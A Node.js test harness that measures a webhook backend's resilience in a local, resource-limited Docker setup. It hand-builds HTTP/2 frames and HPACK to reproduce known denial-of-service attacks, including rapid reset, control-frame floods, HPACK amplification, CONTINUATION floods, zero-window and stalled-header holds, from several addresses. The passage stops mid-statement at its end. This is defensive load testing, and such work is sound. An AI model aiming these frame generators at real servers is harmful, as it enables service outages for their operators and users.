#!/usr/bin/env node
/**
 * The HTTP/2 hostile-input measurement of issue #208 (D266): the attack shapes
 * an HTTP/2 receive path brings, run against the #207 path with
 * `RECEIVE_HTTP2=on`, on the local stack limited as production is, at three
 * growing sizes and from 1, 2, 4 and 8 attacking addresses, while 10 ordinary
 * webhooks a second come from a ninth address. It states each shape's result
 * as D228 states its series: the number of attacking addresses survived under
 * D228's pass bar (no OOM kill or restart, no `error` log line, `memory.peak`
 * at or under 400 MiB, every small capture stored, the slowest within 5 s - a
 * latency miss under CPU starvation recorded, not failed).
 *
 * Run from the repository's root on a machine with Docker, nothing else
 * listening on its behalf:
 *
 *   node scripts/measure-http2-hostile.mjs [shape ...] \
 *     [--sizes small,medium,large] [--addresses 1,2,4,8] [--keep] \
 *     [--image <backend image>]
 *
 * It starts `scripts/measure-http2-hostile.compose.yml` - the backend image
 * built from this checkout, 0.5 CPU and 512 MiB, `RECEIVE_HTTP2=on`,
 * PostgreSQL, Traefik 3.7.8 in front of it and a client container on nine
 * networks - runs each shape at each size and address count against a backend
 * container of its own, reads that container's memory from outside every
 * 200 ms, prints one JSON line per series, and removes every container and
 * network it started, its last line `{"down":...}` naming any left. `--keep`
 * leaves them; the built image `dev208-http2-backend` is left for the next
 * run. `--image` runs a prebuilt backend image and builds nothing. Nothing is
 * pulled; it never touches `hook.qa-tools.ru` (criterion 6).
 *
 * Known limits: the medium and large sizes cannot complete today. The
 * backend's whole log is read into a 256 MiB buffer, which the medium
 * `reset` filled from 4 addresses (D266 point 4), and `literalBlock` spreads
 * a field's bytes into one call, which overflows the call stack from 262,144
 * bytes, so the medium and large `continuation` and the large `longpath` fail
 * before sending (D266 point 7). Both fixes are #298's.
 *
 * Shapes (a group name, or several):
 * - `reset`: connections that open a stream and at once reset it, repeatedly
 *   (rapid reset, CVE-2023-44487); MadeYouReset's cousin.
 * - `ping`, `settings`, `empty-data`, `priority`: control-frame floods
 *   (CVE-2019-9512/-9513/-9515/-9518).
 * - `hpack`: HPACK-amplified lists on 32 streams of each connection, sent
 *   before the SETTINGS ACK (CVE-2024-27983/-28182).
 * - `continuation`: one header field over 64 KiB, a connection error that
 *   kills the whole connection (comment 5).
 * - `window`: an answer held by a zero window, no WINDOW_UPDATE, the
 *   connection left open (CVE-2019-9517, comment 1).
 * - `session-memory`: streams holding open bodies against the capture budget,
 *   8, 16 or 32 streams of 8,000 bytes a connection - far under the 10 MB of
 *   `maxSessionMemory`, whose refusal no size reaches (#278).
 * - `stalled-headers`: a header block left open mid-CONTINUATION, its fields
 *   decoded and held until the connection closes (D266 point 4).
 * - `longpath`: a `:path` over HTTP/1.1's 16 KiB - one byte over at the
 *   smallest size - refused by the bound this issue adds (D266, comment 6).
 *
 * `all` names every shape; it is the default. Each size scales the shape's
 * per-connection cost; `--addresses` the attacking addresses it spreads over.
 *
 * Dependency-free, Node 24; the HTTP/2 frames and HPACK are hand-built here as
 * in `apps/backend/src/testing/http2.ts`, so the client needs no package.
 */
import { execFile, spawn } from 'node:child_process';
import { Buffer } from 'node:buffer';
import console from 'node:console';
import http from 'node:http';
import net from 'node:net';
import { performance } from 'node:perf_hooks';
import process from 'node:process';
import readline from 'node:readline';
import { readFileSync, realpathSync, writeFileSync } from 'node:fs';
import { setTimeout as sleep } from 'node:timers/promises';
import tls from 'node:tls';
import { URL, fileURLToPath } from 'node:url';

const MIB = 1024 * 1024;

/* ------------------------------------------------------------------------ */
/* The client, inside the client container.                                 */
/* ------------------------------------------------------------------------ */

const API = 'http://10.148.1.3:3000';
const BACKEND = '10.148.1.3';
const RECEIVE_PORT = 3001;
const EDGE_PORT = 8443;
const RECEIVE_HOST = 'hook.qa-tools.test';

/** Traefik as each attacking address reaches it, and the address bound locally. */
const ATTACK = Array.from({ length: 8 }, (_unused, index) => ({
  host: `10.148.${index + 1}.2`,
  local: `10.148.${index + 1}.10`,
}));
/** The small captures' address, never one of `ATTACK`. */
const SMALL_ADDRESS = '198.51.100.77';

const PROXY_V2_SIGNATURE = Buffer.from([
  0x0d, 0x0a, 0x0d, 0x0a, 0x00, 0x0d, 0x0a, 0x51, 0x55, 0x49, 0x54, 0x0a,
]);

function emit(line) {
  console.log(JSON.stringify(line));
}

/* --- HTTP/2 frames and HPACK, hand-built (apps/backend/src/testing/http2.ts) --- */

const PREFACE = Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n', 'latin1');
const FRAME_DATA = 0x0;
const FRAME_HEADERS = 0x1;
const FRAME_PRIORITY = 0x2;
const FRAME_RST_STREAM = 0x3;
const FRAME_SETTINGS = 0x4;
const FRAME_PING = 0x6;
const FRAME_GOAWAY = 0x7;
const FRAME_CONTINUATION = 0x9;
const FLAG_END_STREAM = 0x1;
const FLAG_END_HEADERS = 0x4;
const MAX_FRAME_PAYLOAD = 16_384;
const NGHTTP2_CANCEL = 0x8;
const SETTINGS_INITIAL_WINDOW_SIZE = 0x4;

function frame(type, flags, streamId, payload) {
  const header = Buffer.alloc(9);

  header.writeUIntBE(payload.length, 0, 3);
  header[3] = type;
  header[4] = flags;
  header.writeUInt32BE(streamId & 0x7fffffff, 5);

  return Buffer.concat([header, payload]);
}

function hpackInteger(value, prefixBits) {
  const limit = (1 << prefixBits) - 1;

  if (value < limit) {
    return [value];
  }

  const bytes = [limit];
  let rest = value - limit;

  while (rest >= 128) {
    bytes.push((rest % 128) + 128);
    rest = Math.floor(rest / 128);
  }

  bytes.push(rest);

  return bytes;
}

/** A block of literal fields without indexing, new names, no Huffman (RFC 7541 §6.2.2). */
function literalBlock(fields) {
  const bytes = [];

  for (const [name, value] of fields) {
    const nameBytes = Buffer.from(name, 'latin1');
    const valueBytes = Buffer.from(value, 'latin1');

    bytes.push(0x00, ...hpackInteger(nameBytes.length, 7), ...nameBytes);
    bytes.push(...hpackInteger(valueBytes.length, 7), ...valueBytes);
  }

  return Buffer.from(bytes);
}

/** One field added to the dynamic table, then `references - 1` one-byte references to it. */
function amplifiedFields(name, valueBytes, references) {
  const nameBytes = Buffer.from(name, 'latin1');

  return Buffer.concat([
    Buffer.from([0x40, ...hpackInteger(nameBytes.length, 7)]),
    nameBytes,
    Buffer.from(hpackInteger(valueBytes, 7)),
    Buffer.alloc(valueBytes, 0x42),
    Buffer.alloc(references - 1, 0x80 | 62),
  ]);
}

/** A header block as HEADERS and as many CONTINUATION frames as its size needs. */
function headerFrames(block, streamId, endStream) {
  const frames = [];

  for (let offset = 0; offset === 0 || offset < block.length; offset += MAX_FRAME_PAYLOAD) {
    const first = offset === 0;
    const last = offset + MAX_FRAME_PAYLOAD >= block.length;
    const flags = (last ? FLAG_END_HEADERS : 0) | (first && endStream ? FLAG_END_STREAM : 0);

    frames.push(
      frame(
        first ? FRAME_HEADERS : FRAME_CONTINUATION,
        flags,
        streamId,
        block.subarray(offset, offset + MAX_FRAME_PAYLOAD),
      ),
    );
  }

  return Buffer.concat(frames);
}

function requestBlock(
  sessionId,
  { method = 'POST', pathSuffix = '', authority = RECEIVE_HOST } = {},
) {
  return literalBlock([
    [':method', method],
    [':scheme', 'http'],
    [':path', `/s/${sessionId}${pathSuffix}`],
    [':authority', authority],
  ]);
}

function settingsFrame(entries) {
  const payload = Buffer.alloc(entries.length * 6);

  entries.forEach(([id, value], index) => {
    payload.writeUInt16BE(id, index * 6);
    payload.writeUInt32BE(value >>> 0, index * 6 + 2);
  });

  return frame(FRAME_SETTINGS, 0, 0, payload);
}

function uint32(value) {
  const bytes = Buffer.alloc(4);

  bytes.writeUInt32BE(value >>> 0);

  return bytes;
}

/** The frame types a connection received, in order, as far as they are whole. */
function receivedFrameTypes(bytes) {
  const types = [];
  let offset = 0;

  while (offset + 9 <= bytes.length) {
    const length = bytes.readUIntBE(offset, 3);

    types.push(bytes[offset + 3]);
    offset += 9 + length;
  }

  return types;
}

/* --- The application listener, straight: session creation and counts --- */

function api(path, method = 'GET', payload, extraHeaders = {}) {
  return new Promise((resolve, reject) => {
    const headers = {
      ...extraHeaders,
      ...(payload === undefined
        ? {}
        : { 'content-type': 'application/json', 'content-length': Buffer.byteLength(payload) }),
    };
    const call = http.request(`${API}${path}`, { method, headers, agent: false }, (response) => {
      const chunks = [];

      response.on('data', (chunk) => chunks.push(chunk));
      response.on('end', () =>
        resolve({ status: response.statusCode, text: Buffer.concat(chunks).toString('utf8') }),
      );
    });

    call.on('error', reject);
    call.end(payload);
  });
}

async function createSession(delayMs = 0) {
  const answer = await api(
    '/api/sessions',
    'POST',
    delayMs > 0
      ? JSON.stringify({ response: { status: 200, body: '{"held":true}', delayMs } })
      : undefined,
  );

  if (answer.status !== 201) {
    throw new Error(`creating a session answered ${answer.status}: ${answer.text}`);
  }

  return JSON.parse(answer.text).id;
}

async function requestsCount(sessionId) {
  const answer = await api(`/api/sessions/${sessionId}`);

  return answer.status === 200 ? JSON.parse(answer.text).requestsCount : null;
}

/* --- The small captures (HTTP/1.1, straight to the backend with a PROXY header) --- */

function smallProxyHeader(source) {
  const addresses = Buffer.concat([
    Buffer.from(source.split('.').map(Number)),
    Buffer.from([10, 42, 0, 24]),
    Buffer.from([0xc3, 0x50, 0x20, 0xfb]),
  ]);
  const fixed = Buffer.from([0x21, 0x11, 0, addresses.length]);

  return Buffer.concat([PROXY_V2_SIGNATURE, fixed, addresses]);
}

function smallCapture(sessionId) {
  const started = performance.now();

  return new Promise((resolve) => {
    const socket = net.connect(RECEIVE_PORT, BACKEND);
    const chunks = [];
    let settled = false;
    const settle = () => {
      if (settled) {
        return;
      }

      settled = true;

      const text = Buffer.concat(chunks).toString('latin1');
      const errorCode = /"errorCode":(\d+)/.exec(text)?.[1];

      resolve({
        status: Number(/^HTTP\/1\.1 (\d{3})/.exec(text)?.[1] ?? 0),
        ...(errorCode === undefined ? {} : { errorCode: Number(errorCode) }),
        ms: performance.now() - started,
      });
    };

    socket.on('data', (chunk) => chunks.push(chunk));
    socket.on('error', settle);
    socket.on('close', settle);
    socket.on('connect', () => {
      socket.write(smallProxyHeader(SMALL_ADDRESS));
      socket.write(
        `POST /s/${sessionId} HTTP/1.1\r\nHost: ${RECEIVE_HOST}\r\nConnection: close\r\n` +
          'Content-Type: application/json\r\nContent-Length: 17\r\n\r\n{"event":"small"}',
      );
    });
  });
}

async function smallWorker(sessionId, perSecond, outFile) {
  const fired = [];
  let running = true;

  process.on('SIGTERM', () => {
    running = false;
  });

  let next = performance.now();

  while (running) {
    fired.push(smallCapture(sessionId));
    next += 1_000 / perSecond;

    const wait = next - performance.now();

    if (wait > 0) {
      await sleep(wait);
    }
  }

  const answers = await Promise.all(fired);

  writeFileSync(
    outFile,
    JSON.stringify(
      answers.map((answer) => ({
        status: answer.status,
        ...(answer.errorCode === undefined ? {} : { errorCode: answer.errorCode }),
        ms: answer.ms,
      })),
    ),
  );
}

function smallCaptures(sessionId, perSecond) {
  const outFile = `/tmp/small-${process.pid}-${sessionId}.json`;
  const child = spawn(
    process.execPath,
    [fileURLToPath(import.meta.url), 'small-worker', sessionId, String(perSecond), outFile],
    { stdio: 'ignore' },
  );

  return {
    async stop() {
      child.kill('SIGTERM');
      await new Promise((resolve) => child.on('exit', resolve));

      try {
        return JSON.parse(readFileSync(outFile, 'utf8'));
      } catch {
        return [];
      }
    },
  };
}

/* --- One attacking connection, a TLS connection to Traefik bound to an address --- */

function secureFrom(address) {
  return new Promise((resolve) => {
    const socket = tls.connect({
      host: address.host,
      port: EDGE_PORT,
      localAddress: address.local,
      servername: RECEIVE_HOST,
      ALPNProtocols: ['http/1.1'],
      rejectUnauthorized: false,
    });
    const chunks = [];
    const state = {
      socket,
      received: () => Buffer.concat(chunks),
      secured: false,
      closed: false,
      error: null,
    };

    socket.on('data', (chunk) => chunks.push(chunk));
    socket.on('error', (error) => {
      state.error = error.code ?? String(error);
    });
    socket.on('close', () => {
      state.closed = true;
    });
    socket.once('secureConnect', () => {
      state.secured = true;
      socket.write(Buffer.concat([PREFACE, settingsFrame([])]));
      resolve(state);
    });
    socket.once('error', () => resolve(state));
  });
}

/** The three sizes of each shape, scaling its per-connection cost. */
const SIZES = {
  reset: { small: 50, medium: 500, large: 5_000 }, // resets per connection
  ping: { small: 200, medium: 2_000, large: 20_000 }, // frames per connection
  settings: { small: 200, medium: 2_000, large: 20_000 },
  'empty-data': { small: 200, medium: 2_000, large: 20_000 },
  priority: { small: 200, medium: 2_000, large: 20_000 },
  hpack: { small: 500, medium: 2_000, large: 8_000 }, // references per stream
  continuation: { small: 70_000, medium: 262_144, large: 1_048_576 }, // bytes of the huge field
  window: { small: 128, medium: 256, large: 512 }, // connections held open per address
  'session-memory': { small: 8, medium: 16, large: 32 }, // streams per connection
  longpath: { small: 16_385, medium: 106_496, large: 524_288 }, // bytes of :path
  'stalled-headers': { small: 16_000, medium: 65_536, large: 131_072 }, // bytes of the open block
};

/** How many connections a shape opens per address, unless the size sets it. */
const CONNECTIONS = {
  reset: 256,
  ping: 256,
  settings: 256,
  'empty-data': 256,
  priority: 256,
  hpack: 4,
  continuation: 256,
  window: 0, // the size is the connection count
  'session-memory': 128,
  longpath: 256,
  'stalled-headers': 256,
};

const CONTROL_FRAME = {
  ping: () => frame(FRAME_PING, 0, 0, Buffer.alloc(8)),
  settings: () => settingsFrame([[SETTINGS_INITIAL_WINDOW_SIZE, 65_535]]),
  priority: () => frame(FRAME_PRIORITY, 0, 1, Buffer.concat([uint32(0), Buffer.from([0])])),
};

/**
 * Writes the shape's frames on a fresh connection from `address` to the
 * session `sessionId`, holding it open for the held shapes. Resolves with the
 * connection's state once its frames are out.
 */
async function attackConnection(shape, size, address, sessionId) {
  const connection = await secureFrom(address);

  if (!connection.secured) {
    return connection;
  }

  const { socket } = connection;

  if (shape === 'reset') {
    const batch = [];

    for (let index = 0; index < size; index += 1) {
      const streamId = 1 + 2 * index;

      batch.push(frame(FRAME_HEADERS, FLAG_END_HEADERS, streamId, requestBlock(sessionId)));
      batch.push(frame(FRAME_RST_STREAM, 0, streamId, uint32(NGHTTP2_CANCEL)));
    }

    socket.write(Buffer.concat(batch));
  } else if (shape in CONTROL_FRAME) {
    const make = CONTROL_FRAME[shape];
    const batch = [];

    for (let index = 0; index < size; index += 1) {
      batch.push(make());
    }

    socket.write(Buffer.concat(batch));
  } else if (shape === 'empty-data') {
    socket.write(frame(FRAME_HEADERS, FLAG_END_HEADERS, 1, requestBlock(sessionId)));

    const batch = [];

    for (let index = 0; index < size; index += 1) {
      batch.push(frame(FRAME_DATA, 0, 1, Buffer.alloc(0)));
    }

    socket.write(Buffer.concat(batch));
  } else if (shape === 'hpack') {
    const streams = Array.from({ length: 32 }, (_unused, index) => 1 + 2 * index);

    socket.write(
      Buffer.concat(
        streams.map((streamId) =>
          headerFrames(
            Buffer.concat([
              requestBlock(sessionId, { pathSuffix: `/${streamId}` }),
              amplifiedFields('x-big', 4_000, size),
            ]),
            streamId,
            true,
          ),
        ),
      ),
    );
  } else if (shape === 'continuation') {
    socket.write(
      headerFrames(
        Buffer.concat([requestBlock(sessionId), literalBlock([['x-huge', 'a'.repeat(size)]])]),
        1,
        true,
      ),
    );
  } else if (shape === 'stalled-headers') {
    // A header block left open: HEADERS and CONTINUATION frames carrying
    // `size` bytes of distinct literal fields, none END_HEADERS, so
    // nghttp2 decodes and holds the fields until a close (D266 point 4).
    const fields = Array.from({ length: Math.ceil(size / 12) + 8 }, (_unused, index) => [
      `x-${index}`,
      'v'.repeat(4),
    ]);
    const block = Buffer.concat([requestBlock(sessionId), literalBlock(fields)]).subarray(0, size);

    for (let offset = 0; offset < block.length; offset += MAX_FRAME_PAYLOAD) {
      socket.write(
        frame(
          offset === 0 ? FRAME_HEADERS : FRAME_CONTINUATION,
          0,
          1,
          block.subarray(offset, offset + MAX_FRAME_PAYLOAD),
        ),
      );
    }
  } else if (shape === 'longpath') {
    const head = `/s/${sessionId}?p=`;
    const pathSuffix = `?p=${'a'.repeat(Math.max(0, size - head.length))}`;

    socket.write(headerFrames(requestBlock(sessionId, { method: 'GET', pathSuffix }), 1, true));
  } else if (shape === 'window') {
    // A request whose answer is held: the client advertised window 0 in its
    // SETTINGS (below), so the server cannot send the answer body; it never
    // sends a WINDOW_UPDATE and leaves the connection open.
    socket.write(headerFrames(requestBlock(sessionId), 1, false));
    socket.write(frame(FRAME_DATA, FLAG_END_STREAM, 1, Buffer.from('x')));
  } else if (shape === 'session-memory') {
    // `size` streams, each holding 8,000 bytes of DATA open; together under a
    // connection window, buffered against the 10 MB session memory.
    const chunk = 8_000;

    for (let index = 0; index < size; index += 1) {
      const streamId = 1 + 2 * index;

      socket.write(
        headerFrames(
          Buffer.concat([
            requestBlock(sessionId),
            literalBlock([['content-length', String(chunk)]]),
          ]),
          streamId,
          false,
        ),
      );
      socket.write(frame(FRAME_DATA, 0, streamId, Buffer.alloc(chunk, 0x61)));

      if ((index + 1) % 8 === 0) {
        // Keep under the connection window: give it back by reading nothing
        // and pausing between batches so the server's WINDOW_UPDATE arrives.
        await sleep(20);
      }
    }
  }

  return connection;
}

async function runShape(shape, size, addrCount) {
  const addresses = ATTACK.slice(0, addrCount);
  const smallPerSecond = Number(process.env.SMALL_PER_SECOND ?? 10);
  const holdS = Number(process.env.HOLD_S ?? 20);
  const connectionsPerAddress = shape === 'window' ? size : (CONNECTIONS[shape] ?? 64);
  // `window`'s client advertises a zero initial window so answers are held.
  const perConnectionSize = shape === 'window' ? 0 : size;

  const sessions = await Promise.all(addresses.map(() => createSession(0)));
  const smallSessionId = await createSession(0);
  const small = smallCaptures(smallSessionId, smallPerSecond);

  emit({ phase: 'warm' });
  await sleep(Number(process.env.BASELINE_S ?? 3) * 1_000);
  emit({ phase: 'held' });

  const held = [];
  const startedAt = performance.now();

  await Promise.all(
    addresses.map(async (address, addressIndex) => {
      const sessionId = sessions[addressIndex];

      for (let index = 0; index < connectionsPerAddress; index += 1) {
        // `window` overrides the SETTINGS the connection opens with.
        const connection =
          shape === 'window'
            ? await openWindowZero(address, sessionId)
            : await attackConnection(shape, perConnectionSize, address, sessionId);

        held.push(connection);
      }
    }),
  );

  const burstMs = Math.round(performance.now() - startedAt);

  await sleep(holdS * 1_000);
  emit({ phase: 'done' });

  let goaways = 0;
  let resets = 0;

  for (const connection of held) {
    if (connection.secured) {
      const types = receivedFrameTypes(connection.received());

      goaways += types.filter((type) => type === FRAME_GOAWAY).length;
      resets += types.filter((type) => type === FRAME_RST_STREAM).length;
    }

    connection.socket?.destroy();
  }

  const smallAnswers = await small.stop();
  const smallStored = await requestsCount(smallSessionId);
  const storedPerSession = await Promise.all(sessions.map((sessionId) => requestsCount(sessionId)));
  const ms = smallAnswers.map((answer) => answer.ms).sort((a, b) => a - b);
  const statuses = {};

  for (const answer of smallAnswers) {
    const key =
      answer.errorCode === undefined
        ? String(answer.status)
        : `${answer.status}/${answer.errorCode}`;

    statuses[key] = (statuses[key] ?? 0) + 1;
  }

  return {
    shape,
    size,
    addresses: addrCount,
    connectionsPerAddress,
    perConnectionSize,
    burstMs,
    heldOpen: held.filter((connection) => !connection.closed).length,
    secured: held.filter((connection) => connection.secured).length,
    goaways,
    resets,
    storedPerSession,
    small: {
      sent: smallAnswers.length,
      statuses,
      p50Ms: Math.round(ms[Math.ceil(0.5 * ms.length) - 1] ?? 0),
      maxMs: Math.round(ms.at(-1) ?? 0),
      stored: smallStored,
    },
  };
}

/** A connection whose SETTINGS advertise a zero initial window, for the `window` shape. */
async function openWindowZero(address, sessionId) {
  const connection = await new Promise((resolve) => {
    const socket = tls.connect({
      host: address.host,
      port: EDGE_PORT,
      localAddress: address.local,
      servername: RECEIVE_HOST,
      ALPNProtocols: ['http/1.1'],
      rejectUnauthorized: false,
    });
    const chunks = [];
    const state = {
      socket,
      received: () => Buffer.concat(chunks),
      secured: false,
      closed: false,
      error: null,
    };

    socket.on('data', (chunk) => chunks.push(chunk));
    socket.on('error', (error) => {
      state.error = error.code ?? String(error);
    });
    socket.on('close', () => {
      state.closed = true;
    });
    socket.once('secureConnect', () => {
      state.secured = true;
      socket.write(Buffer.concat([PREFACE, settingsFrame([[SETTINGS_INITIAL_WINDOW_SIZE, 0]])]));
      resolve(state);
    });
    socket.once('error', () => resolve(state));
  });

  if (connection.secured) {
    connection.socket.write(headerFrames(requestBlock(sessionId), 1, false));
    connection.socket.write(frame(FRAME_DATA, FLAG_END_STREAM, 1, Buffer.from('x')));
  }

  return connection;
}

async function client(shape, size, addrCount) {
  const report = await runShape(shape, size, addrCount);

  emit({ phase: 'done' });
  emit({ report });
}

/* ------------------------------------------------------------------------ */
/* The orchestration, on the operator's machine.                            */
/* ------------------------------------------------------------------------ */

const COMPOSE_FILE = fileURLToPath(new URL('measure-http2-hostile.compose.yml', import.meta.url));
const SAMPLE_MS = Number(process.env.SAMPLE_MS ?? 200);

/** The attacking addresses, as the backend's PROXY layer names them, and the small captures' one. */
const SENDERS = [...ATTACK.map((address) => address.local), SMALL_ADDRESS];

const ALL_SHAPES = [
  'reset',
  'ping',
  'settings',
  'empty-data',
  'priority',
  'hpack',
  'continuation',
  'window',
  'session-memory',
  'longpath',
  'stalled-headers',
];

let backendImage = null;

function compose(args, { env = {}, timeoutMs = 600_000, maxBuffer = 64 * MIB } = {}) {
  return new Promise((resolve, reject) => {
    execFile(
      'docker',
      ['compose', '-f', COMPOSE_FILE, ...args],
      {
        env: {
          ...process.env,
          ...(backendImage === null ? {} : { MEASURE_BACKEND_IMAGE: backendImage }),
          ...env,
        },
        timeout: timeoutMs,
        maxBuffer,
      },
      (error, stdout, stderr) => {
        if (error) {
          reject(new Error(`docker compose ${args.join(' ')}: ${error.message}\n${stderr}`));
        } else {
          resolve(stdout);
        }
      },
    );
  });
}

async function memory() {
  const text = await compose([
    'exec',
    '-T',
    'backend',
    'sh',
    '-c',
    'cat /sys/fs/cgroup/memory.current /sys/fs/cgroup/memory.peak; ' +
      'grep -E "^(VmRSS|VmHWM|RssAnon):" /proc/1/status; ' +
      'grep -E "^(anon|file|kernel|sock) " /sys/fs/cgroup/memory.stat',
  ]);
  const lines = text.trim().split('\n');
  const kb = (name) =>
    Number(/(\d+) kB/.exec(lines.find((line) => line.startsWith(name)) ?? '')?.[1]) * 1024;
  const stat = (name) => Number(new RegExp(`^${name} (\\d+)`, 'm').exec(text)?.[1] ?? 0);
  const reading = {
    current: Number(lines[0]),
    peak: Number(lines[1]),
    rss: kb('VmRSS'),
    hwm: kb('VmHWM'),
    rssAnon: kb('RssAnon'),
    anon: stat('anon'),
    file: stat('file'),
    kernel: stat('kernel'),
    sock: stat('sock'),
  };

  return { ...reading, own: reading.rssAnon + reading.kernel + reading.sock };
}

async function backendState() {
  let text;

  try {
    text = (await compose(['ps', '-a', '--format', 'json', 'backend'])).trim();
  } catch (error) {
    return { read: false, error: String(error?.message ?? error).slice(0, 300) };
  }

  try {
    const entries = text.startsWith('[')
      ? JSON.parse(text)
      : text
          .split('\n')
          .filter(Boolean)
          .map((line) => JSON.parse(line));
    const entry = entries[0];

    if (entry === undefined) {
      return { read: false, error: 'no backend container' };
    }

    const exitCode = Number(entry.ExitCode ?? 0);
    const running = entry.State === 'running';

    return {
      read: true,
      state: entry.State,
      exitCode: running ? null : exitCode,
      outOfMemory: !running && (exitCode === 133 || exitCode === 137),
    };
  } catch (error) {
    return { read: false, error: String(error?.message ?? error).slice(0, 300) };
  }
}

const mib = (bytes) => Math.round((bytes / MIB) * 10) / 10;

async function runSeries(shape, size, addrCount) {
  await compose(['up', '-d', '--force-recreate', '--no-deps', '--wait', 'backend']);

  const restartsBefore = (
    await compose(['ps', '--format', '{{.Name}} {{.Status}}', 'backend'])
  ).trim();
  const sampleFailures = [];
  const samples = [];
  let baseline = null;
  let sampling = false;
  let report = null;
  const tryMemory = async () => {
    try {
      return await memory();
    } catch (error) {
      sampleFailures.push(String(error?.message ?? error).slice(0, 300));

      return null;
    }
  };
  const sample = async () => {
    while (sampling) {
      const reading = await tryMemory();

      if (reading !== null) {
        samples.push(reading);
      }

      await sleep(SAMPLE_MS);
    }
  };
  let sampler = Promise.resolve();

  const child = spawn(
    'docker',
    [
      'compose',
      '-f',
      COMPOSE_FILE,
      'exec',
      '-T',
      '-e',
      `SMALL_PER_SECOND=${process.env.SMALL_PER_SECOND ?? 10}`,
      '-e',
      `HOLD_S=${process.env.HOLD_S ?? 20}`,
      'client',
      'node',
      '/scripts/measure-http2-hostile.mjs',
      'client',
      shape,
      String(size),
      String(addrCount),
    ],
    {
      env: {
        ...process.env,
        ...(backendImage === null ? {} : { MEASURE_BACKEND_IMAGE: backendImage }),
      },
      stdio: ['ignore', 'pipe', 'inherit'],
    },
  );
  const lines = readline.createInterface({ input: child.stdout });

  for await (const line of lines) {
    let parsed;

    try {
      parsed = JSON.parse(line);
    } catch {
      continue;
    }

    if (parsed.phase === 'warm' && baseline === null) {
      baseline = await tryMemory();
      sampling = true;
      sampler = sample();
    } else if (parsed.phase === 'done') {
      sampling = false;
    } else if (parsed.report !== undefined) {
      report = parsed.report;
    }
  }

  sampling = false;
  await sampler;

  const final = (await tryMemory()) ?? samples.at(-1) ?? baseline;
  const state = await backendState();
  const status = (
    await compose(['ps', '-a', '--format', '{{.Name}} {{.Status}}', 'backend'])
  ).trim();
  const logs = await compose(['logs', '--no-color', 'backend'], { maxBuffer: 256 * MIB });
  const logLines = logs.split('\n');
  const errorLogLines = logLines.filter((line) => /"level":(50|60)/.test(line));
  const senderLines = logLines
    .map((line) => line.replace(/"remoteAddress":"[^"]*"/g, '').replace(/"host":"[^"]*"/g, ''))
    .filter((line) => SENDERS.some((address) => line.includes(address)));
  const top = (field) =>
    Math.max(...[...samples, final].map((each) => each?.[field]).filter(Number.isFinite));
  const peak = final === null ? null : mib(top('peak'));
  const slowestS = report === null ? null : report.small.maxMs / 1_000;
  const bar = {
    running: state.state === 'running',
    noErrorLine: errorLogLines.length === 0,
    peakWithin400MiB: peak !== null && peak <= 400,
    capturesStored:
      report !== null && report.small.stored !== null && report.small.stored === report.small.sent,
    slowestWithin5s: slowestS !== null && slowestS <= 5,
  };

  // The pass bar without the latency clause, which D228 lets CPU starvation miss.
  bar.metExceptLatency =
    bar.running && bar.noErrorLine && bar.peakWithin400MiB && bar.capturesStored;
  bar.met = bar.metExceptLatency && bar.slowestWithin5s;

  return {
    shape,
    size,
    addresses: addrCount,
    bar,
    report,
    backend: {
      before: restartsBefore,
      after: status,
      state,
      errorLines: errorLogLines.length,
      errorLinesSample: errorLogLines.slice(0, 3).map((line) => line.slice(0, 300)),
      linesNamingASender: senderLines.length,
      linesNamingASenderSample: senderLines.slice(0, 3).map((line) => line.slice(0, 300)),
    },
    memory:
      baseline === null || final === null
        ? null
        : {
            baselineOwnMiB: mib(baseline.own),
            peakMiB: {
              cgroupPeak: mib(top('peak')),
              hwm: mib(top('hwm')),
              rssAnon: mib(top('rssAnon')),
            },
            growthOwnMiB: mib(top('own') - baseline.own),
            samples: samples.length,
          },
    sampling: {
      failures: sampleFailures.length,
      firstFailure: sampleFailures[0] ?? null,
      peakSampledMiB: samples.length === 0 ? null : mib(Math.max(...samples.map((s) => s.peak))),
    },
  };
}

async function leftovers() {
  try {
    const project = JSON.parse(await compose(['config', '--format', 'json'])).name;
    const containers = (await compose(['ps', '-a', '--format', '{{.Name}}']))
      .split('\n')
      .filter((line) => line.trim() !== '');
    const networks = await new Promise((resolve, reject) => {
      execFile(
        'docker',
        [
          'network',
          'ls',
          '--filter',
          `label=com.docker.compose.project=${project}`,
          '--format',
          '{{.Name}}',
        ],
        { timeout: 60_000 },
        (error, stdout) =>
          error ? reject(error) : resolve(stdout.split('\n').filter((line) => line.trim() !== '')),
      );
    });

    return { project, containers, networks };
  } catch (error) {
    return { error: String(error?.message ?? error).slice(0, 300) };
  }
}

function listArg(argv, name, fallback) {
  const index = argv.indexOf(name);

  return index === -1 ? fallback : argv[index + 1].split(',').map((value) => value.trim());
}

async function orchestrate(argv) {
  const keep = argv.includes('--keep');
  const imageIndex = argv.indexOf('--image');

  backendImage = imageIndex === -1 ? null : argv[imageIndex + 1];

  const sizes = listArg(argv, '--sizes', ['small']);
  const addressCounts = listArg(argv, '--addresses', ['1', '2', '4', '8']).map(Number);
  const takesValue = new Set(
    ['--image', '--sizes', '--addresses']
      .map((flag) => argv.indexOf(flag))
      .filter((index) => index !== -1)
      .map((index) => index + 1),
  );
  const named = argv.filter((arg, index) => !arg.startsWith('--') && !takesValue.has(index));
  const shapes = named.length === 0 || named.includes('all') ? ALL_SHAPES : named;

  for (const shape of shapes) {
    if (!ALL_SHAPES.includes(shape)) {
      throw new Error(`no such shape: ${shape}; the shapes are ${ALL_SHAPES.join(', ')}`);
    }
  }

  if (backendImage === null) {
    await compose(['build', 'migrate'], { timeoutMs: 1_200_000 });
  }

  try {
    await compose(['up', '-d', '--wait', 'postgres', 'traefik', 'client']);
    await compose(['up', 'migrate'], { timeoutMs: 120_000 });

    for (const shape of shapes) {
      for (const size of sizes) {
        if (SIZES[shape][size] === undefined) {
          throw new Error(`no such size: ${size}; sizes are small, medium, large`);
        }

        for (const addrCount of addressCounts) {
          console.log(JSON.stringify(await runSeries(shape, SIZES[shape][size], addrCount)));
        }
      }
    }
  } finally {
    if (!keep) {
      await compose(['down', '--volumes', '--remove-orphans'], { timeoutMs: 120_000 });
      console.log(JSON.stringify({ down: await leftovers() }));
    }
  }
}

const isMain = (() => {
  if (process.argv[1] === undefined) {
    return false;
  }

  try {
    return realpathSync(fileURLToPath(import.meta.url)) === realpathSync(process.argv[1]);
  } catch {
    return false;
  }
})();

if (isMain) {
  if (process.argv[2] === 'client') {
    await client(process.argv[3], Number(process.argv[4]), Number(process.argv[5]));
  } else if (process.argv[2] === 'small-worker') {
